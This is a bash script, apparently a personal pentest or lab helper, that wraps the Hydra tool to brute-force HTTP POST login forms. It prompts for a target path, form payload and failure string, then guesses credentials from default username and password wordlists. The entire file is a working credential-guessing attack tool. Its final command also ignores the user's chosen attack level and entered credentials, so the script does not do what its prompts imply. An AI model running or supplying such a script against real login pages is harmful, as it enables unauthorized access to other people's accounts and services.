#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 80_HTTP - HYDRA [HOSTNAME] | THIS_FILE ${fetcher.hostname} ${fetcher.comment} | TRUE            |           |
# | 80_HTTP - HYDRA [IP]       | THIS_FILE ${fetcher.ip} ${fetcher.comment}      | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : HYDRA_WEB.sh
# | Description       : Script for conducting Hydra attacks on HTTP services.
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/HYDRA_WEB.sh
# | Author            : Jordon Archer
# | Date              : August 24, 2023
# ------------------------------------------------------------------------------

address=$1
comment=$2

mkdir ~/Documents/BOXES/$comment -p
cd ~/Documents/BOXES/$comment

# Define color variables
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
YELLOW=$(tput setaf 3)
NC=$(tput sgr0) # No Color

# Define username and password lists
user_name_list_1="$HOME/WORDLISTS/usernames/http_default_users.txt"
user_name_list_2="$HOME/WORDLISTS/usernames/cirt_default_usernames.txt"
user_name_list_3="$HOME/WORDLISTS/usernames/multiple_sources_users.txt"
user_name_list_4="$HOME/WORDLISTS/usernames/xato_net_usernames.txt"

password_list_1="$HOME/WORDLISTS/passwords/http_default_passwords.txt"
password_list_2="$HOME/WORDLISTS/passwords/unix_passwords.txt"
password_list_3="$HOME/WORDLISTS/passwords/most_used_passwords.txt"
password_list_4="$HOME/WORDLISTS/passwords/xato_net_passwords.txt"

# Ask the user for the level of attack
read -e -p "${YELLOW}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level

case $attack_level in
    1)
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
    2)
        user_name_list=$user_name_list_2
        password_list=$password_list_2
        verbose="-v"
        ;;
    3)
        user_name_list=$user_name_list_3
        password_list=$password_list_3
        verbose="-v"
        ;;
    4)
        user_name_list=$user_name_list_4
        password_list=$password_list_4
        verbose="-v"
        ;;
    *)
        echo "Invalid attack level. Defaulting to level 1."
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
esac

# Ask the user if they know the username
read -e -p "${YELLOW}Enter the username (if known, else blank): ${NC}" username

if [[ $username != "" ]]; then
    username_section="-l $username"
else
    username_section="-L $user_name_list"
fi

# Ask the user if they know the password
read -e -p "${YELLOW}Enter the password (if known, else blank): ${NC}" password

if [[ $password != "" ]]; then
    password_section="-p $password"
else
    password_section="-P $password_list"
fi

# Ask the user for the path
read -e -p "${YELLOW}What is the path of the login page, for example '/login' or '/db/index.php': ${NC}" -i "/" login_dir

# Ask the payload
read -e -p "${YELLOW}What is the payload, for example 'user=^USER&pass=^PASS^': ${NC}" -i "user=%5EUSER%5E&pass=%5EPASS%5E" payload

payload=${payload//%5E/^}

echo "The payload is:"
echo "${GREEN}${payload}${NC}"

# Ask the unsuccessful_text
read -e -p "${YELLOW}What text is displayed on an unsuccessful attempt, for example 'incorrect' or 'unsuccessful': ${NC}" -i "incorrect" unsuccessful_text

# Hydra attack based on user input

hydra -L $user_name_list_1 -P $password_list_1 -e n $address http-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f -o OUTPUT.txt
